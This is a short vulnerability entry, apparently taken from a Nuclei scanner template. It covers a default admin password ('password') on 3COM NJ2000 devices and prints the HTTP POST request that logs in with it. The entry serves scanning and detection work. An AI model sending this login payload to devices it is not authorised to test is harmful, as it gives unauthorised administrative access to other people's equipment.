# Vulnerability: 3COM NJ2000 - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`3com-nj2000-default-login.yaml`)

## Description
3COM NJ2000 contains a default login vulnerability. Default admin login password of 'password' was found. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

password=password
```

